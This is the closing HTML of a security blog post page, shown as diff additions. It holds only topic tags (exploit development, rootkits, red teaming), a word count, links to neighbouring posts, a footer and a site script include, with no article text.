+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://cybernetic.coffee/tags/exploit-development/">Exploit Development</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/hacking/">hacking</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/redteaming/">redteaming</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/rootkits/">rootkits</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/security-research/">security research</a></span>
+        
+    </p>
+
+
+
+            <p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                    <polyline points="14 2 14 8 20 8"></polyline>
+                    <line x1="16" y1="13" x2="8" y2="13"></line>
+                    <line x1="16" y1="17" x2="8" y2="17"></line>
+                    <polyline points="10 9 9 9 8 9"></polyline>
+                </svg>
+                1025 Words
+            </p>
+  		</div>
+        
+
+
+        
+            
+                <div class="pagination">
+                    <div class="pagination__title">
+                        <span class="pagination__title-h"></span>
+
+                    </div>
+
+                    <div class="pagination__buttons">
+                        
+                        <span class="button previous">
+                      <a href="https://cybernetic.coffee/blog/building-a-rest-api/">
+                        <span class="button__icon">←</span>
+                        <span class="button__text">Building A REST API</span>
+                      </a>
+                    </span>
+                        
+
+                        
+                            <span class="button next">
+                              <a href="https://cybernetic.coffee/blog/hello-kernel/">
+                                <span class="button__text">Hello Kernel</span>
+                                <span class="button__icon">→</span>
+                              </a>
+                            </span>
+                        
+                    </div>
+                </div>
+            
+        
+
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Hacked together with &#10084; by <a href="https://github.com/Angus-C-git">Angus C</a> <i class='fas fa-ghost'></i> </span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.755e4cf350f154c0fee20aa6a1b7fa2b35fcbeaaf4cc62ef45531b19ae1fd43e5ed19c3c3bbf522045953eaef03e1cb96a64a636782486a3aa0b0563d0ef5406.js" integrity="sha512-dV5M81DxVMD&#43;4gqmobf6KzX8vqr0zGLvRVMbGa4f1D5e0Zw8O79SIEWVPq7wPhy5amSmNngkhqOqCwVj0O9UBg=="></script>
+
+
+
+    </body>
+</html>
